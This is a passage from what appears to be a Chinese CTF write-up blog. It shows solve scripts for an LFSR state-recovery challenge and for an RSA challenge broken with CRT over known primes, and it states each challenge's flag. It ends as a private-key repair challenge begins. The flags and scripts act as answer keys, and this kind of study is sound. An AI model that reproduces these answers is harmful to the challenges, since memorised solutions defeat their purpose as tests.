class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        (R,nextbit)=PRNG(R,mask)</span><br><span class="line">        out+=<span class="built_in">str</span>(nextbit)</span><br><span class="line">    output.append(out)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;output=<span class="subst">&#123;output&#125;</span>&#x27;</span>)</span><br><span class="line">output=[<span class="string">&#xx27;</span>, <span class="string">&#xx27;</span>, <span class="string">&#xx27;</span>, <span class="string">&#xx27;</span>]</span><br></pre></td></tr></table></figure><p>分析：</p><p>由于mask的限制 只有mask为1的位置和mask相与才有可能为1 其余全部为0</p><ul><li>理解一下nextbit到底泄露的是什么信息：</li></ul><p>是每一次生成的R与mask做相与运算 然后对每一位做异或运算的结果 但是我们知道 mask只有特定的几个位置为1 其他全部为0 与0异或没有任何意义 1与0异或为1 0与0异或为0 所以不改变任何东西</p><p>故nextbit是每次的R与mask相与之后 mask为1的位置的值进行异或的结果 可能为1 也可能为0</p><ul><li>分析一下R的每一次迭代：</li></ul><p>因为每次R都是左移一位 高位溢出 低位补0 然后与1相与结果还是0 之后与上次生成的nextbit进行异或</p><p>其实就是在低位补充上次生成的nextbit</p><ul><li>分析一下nextbit的前31位的含义：</li></ul><p>R一共32位 其中高31位已经全部被挤出 最高位保留的是R的最低位，下图展示R全部移出的前一个状态</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205205752072.png" alt="image-20240205205752072" style="zoom:50%;" /><p>针对PRNG这个函数进行转化 每次R都会向左移动一位 然后在低位填充的值是nextbit 题目虽然给了1000位 虽然一开始想全部用上，但是这也是一种陷阱吧 稍微对PRNG函数分析一下就会发现其实根本用不上 只需要前31个nextbit就可以恢复</p><p>那么我们恢复的思路就是对1bit进行猜 只有0和1两种情况 校验位分别是mask中为1的位置和生成的下一个bit进行比对，如下图所示</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205210656289.png" alt="image-20240205210656289" style="zoom: 50%;" /><p>先假设猜测位为0 如果验证成功则该位置为0 否则验证失败 该位置为相反值1</p><p>现在得到了本次的状态 然后回溯上次的状态</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205211211246.png" alt="image-20240205211211246" style="zoom:50%;" /><p>相同的方法进行猜测</p><p>依次类推直到R全部恢复</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205211411682.png" alt="image-20240205211411682" style="zoom:50%;" /><p>到此分析流程结束！</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先针对mask提取出相与有效位1</span></span><br><span class="line">mask = <span class="string">&#x27;10001001000010000100010010001001&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mask)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(mask[i]) == <span class="number">1</span>: </span><br><span class="line">        <span class="built_in">print</span>(i, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment">#0 4 7 12 17 21 24 28 31</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后对R进行恢复</span></span><br><span class="line">output = [<span class="string">&#x27;...&#x27;</span>,<span class="string">&#x27;...&#x27;</span>,<span class="string">&#x27;...&#x27;</span>,<span class="string">&#x27;...&#x27;</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    nextbits = output[i]</span><br><span class="line">    </span><br><span class="line">    R = []  <span class="comment">#列表的形式便于插入 从头部 存放已知R的bit位</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):   <span class="comment">#每次恢复1bit 一共32bit 因为与0xffffffff 为限制位数的作用 如果实在不理解 可以用题目的脚本跑一下 看看真实的数据是什么就可以了</span></span><br><span class="line">        temp = <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(R) + nextbits[:(<span class="number">32</span>-<span class="number">1</span>-<span class="built_in">len</span>(R))]   <span class="comment">#凑齐32位 第一个是猜测位为0 第二部分是已知R位 第三部分是nextbit填充位</span></span><br><span class="line">        <span class="built_in">print</span>(temp)</span><br><span class="line">        <span class="comment">#进行猜测校验判断</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">int</span>(temp[<span class="number">0</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">4</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">7</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">12</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">17</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">21</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">24</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">28</span>]) ^ <span class="built_in">int</span>(temp[<span class="number">31</span>]) == <span class="built_in">int</span>(nextbits[<span class="number">32</span>-<span class="number">1</span>-<span class="built_in">len</span>(R)])):</span><br><span class="line">            <span class="comment">#猜测成功填充0</span></span><br><span class="line">            R.insert(<span class="number">0</span>, <span class="string">&#x27;0&#x27;</span>)  <span class="comment">#在第0位插入0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            R.insert(<span class="number">0</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    R = <span class="string">&#x27;&#x27;</span>.join(R)</span><br><span class="line">    R = <span class="built_in">hex</span>(<span class="built_in">int</span>(R,<span class="number">2</span>))[<span class="number">2</span>:]  <span class="comment">#二进制转十进制 转16进制</span></span><br><span class="line">    flag += R</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#fbbbee823f434f919337907880e4191a</span></span><br></pre></td></tr></table></figure><p>最后需要对结果划分</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205214858110.png" alt="image-20240205214858110" style="zoom: 67%;" /><p>其格式是固定的 所以flag：</p><p><code>hgame&#123;fbbbee82-3f43-4f91-9337-907880e4191a&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf-contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-contest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024NssRound16-Crypto</title>
      <link href="/2024/01/15/2024-01-13-nssRound16Cry/"/>
      <url>/2024/01/15/2024-01-13-nssRound16Cry/</url>
      
        <content type="html"><![CDATA[<h1 id="nssround16">nssRound16</h1><p>[TOC]</p><h2 id="crypto">Crypto</h2><h3 id="pr">pr</h3><h4 id="题面：">题面：</h4><p>crt</p><h4 id="考点：同余性质-crt">考点：同余性质 CRT</h4><h4 id="题目：">题目：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag=plaintext = <span class="string">&#x27;NSSCTF&#123;****************&#125;&#x27;</span></span><br><span class="line">charset = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">padding_length = <span class="number">100</span> - <span class="built_in">len</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(padding_length):</span><br><span class="line">    plaintext += random.choice(charset)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line">public_exponent = <span class="number">31413537523</span></span><br><span class="line">message = bytes_to_long(plaintext.encode())</span><br><span class="line"><span class="keyword">assert</span> message &gt; (<span class="number">1</span> &lt;&lt; <span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> message &lt; (<span class="number">1</span> &lt;&lt; <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">prime_p = getPrime(<span class="number">512</span>)</span><br><span class="line">prime_q = getPrime(<span class="number">512</span>)</span><br><span class="line">prime_r = getPrime(<span class="number">512</span>)</span><br><span class="line">n1 = prime_p * prime_q</span><br><span class="line">n2 = prime_q * prime_r</span><br><span class="line">ciphertext1 = <span class="built_in">pow</span>(message, public_exponent, n1)</span><br><span class="line">ciphertext2 = <span class="built_in">pow</span>(message, public_exponent, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1=&#x27;</span>, ciphertext1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2=&#x27;</span>, ciphertext2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>, prime_p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>, prime_r)</span><br><span class="line"></span><br><span class="line">c1= <span class="number">36918910341116680090654563538246204134840776220077189276689868322808977412566781872132517635399441578464309667998925236488280867210758507758915311644529399878185776345227817559234605958783077866016808605942558810445187434690812992072238407431218047312484354859724174751718700409405142819140636116559320641695</span></span><br><span class="line">c2= <span class="number">15601788304485903964195122196382181273808496834343051747331984997977255326224514191280515875796224074672957848566506948553165091090701291545031857563686815297483181025074113978465751897596411324331847008870832527695258040104858667684793196948970048750296571273364559767074262996595282324974180754813257013752</span></span><br><span class="line">p= <span class="number">12101696894052331138951718202838643670037274599483776996203693662637821825873973767235442427190607145999472731101517998719984942030184683388441121181962123</span></span><br><span class="line">r= <span class="number">10199001137987151966640837133782537428248507382360655526592866939552984259171772190788036403425837649697437126360866173688083643144865107648483668545682383</span></span><br></pre></td></tr></table></figure><h4 id="解题：">解题：</h4><p>题目流程简化分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">31413537523</span></span><br><span class="line">n1 = p * q</span><br><span class="line">n2 = q * r</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e, n2)</span><br><span class="line">=&gt;</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, p * q)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e, q * r)</span><br></pre></td></tr></table></figure><p>已知：p、r、c1、c2</p><p>利用同余的性质推导：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240114234254707.png" alt="image-20240114234254707"></p><p>先根据放到缩小模数原理 对c1进行操作</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mtext> </mtext><mo>=</mo><mtext> </mtext><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace><mtext>两边同乘</mtext><mi>q</mi><mspace linebreak="newline"></mspace><msub><mi>c</mi><mn>1</mn></msub><mo>∗</mo><mi>q</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mo>∗</mo><mi>q</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c_1~=~m^e~mod~p\\两边同乘q\\c_1*q = m^e*q~mod~(p*q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">边</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">乘</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>后面利用除法原理</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240114234730136.png" alt="image-20240114234730136"></p><p>其中k代表q m代表p*qk与p*q  互质=&gt;</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c1=m^e~mod~(p*q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>简单来说就是 在同余关系中 模数的因子作为模数仍然存在同余关系，即：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mtext> </mtext><mo>=</mo><mtext> </mtext><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo>∗</mo><mi>q</mi><mspace linebreak="newline"></mspace><mo>=</mo><mo>&gt;</mo><mtext>  </mtext><msub><mi>c</mi><mn>1</mn></msub><mtext> </mtext><mo>=</mo><mtext> </mtext><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">c_1~=~m^e~mod~p*q\\=&gt;~~c_1~=~m^e~mod~p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault">p</span></span></span></span></span></p><p>c2同理</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mtext> </mtext><mo>=</mo><mtext> </mtext><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo>∗</mo><mi>r</mi><mspace linebreak="newline"></mspace><mo>=</mo><mo>&gt;</mo><mtext>  </mtext><msub><mi>c</mi><mn>2</mn></msub><mtext> </mtext><mo>=</mo><mtext> </mtext><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>r</mi></mrow><annotation encoding="application/x-tex">c_2~=~m^e~mod~q*r\\=&gt;~~c_2~=~m^e~mod~r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.8643919999999999em;vertical-align:-0.15em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span></span></p><p>利用中国剩余定理crt，对c1=&gt;p c2=&gt;r</p><p>得到的结果是在p*r域内的$$m^e$$ 也就是对应的密文c</p><p>p r已知 在该域下进行基础的RSA解密</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">c1= ...</span><br><span class="line">c2= ...</span><br><span class="line">p= ...</span><br><span class="line">r= ...</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">31413537523</span></span><br><span class="line">final_c= crt(c1,c2,p,r)</span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(final_c,d,p*r))))</span><br><span class="line"><span class="comment">#b&#x27;NSSCTF&#123;yUanshEnx1ncHun2o23!&#125;FA3JmflIoai8BxgdIGUQumsNc5R0hpo53zICaiWZRfjBj59P36EwC4CSfJOsZ3LIOYnhUmsQ&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="break">break</h3><h4 id="考点：私钥文件-破损修复">考点：私钥文件 破损修复</h4><h4 id="题目：">题目：</h4><p>破损私钥文件：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 